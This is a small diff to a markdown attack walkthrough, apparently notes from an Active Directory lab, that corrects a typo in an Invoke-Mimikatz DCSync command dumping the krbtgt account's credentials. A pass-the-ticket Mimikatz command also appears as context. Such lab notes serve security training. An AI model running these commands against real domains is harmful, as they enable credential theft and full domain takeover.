@@ -417,7 +417,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'
 ### <span style="color:#F1C232">5. Execute DCSync (extra)</span>
 
 ```powershell
-nvoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 ### <span style="color:#F1C232">6. We can access the file system</span>
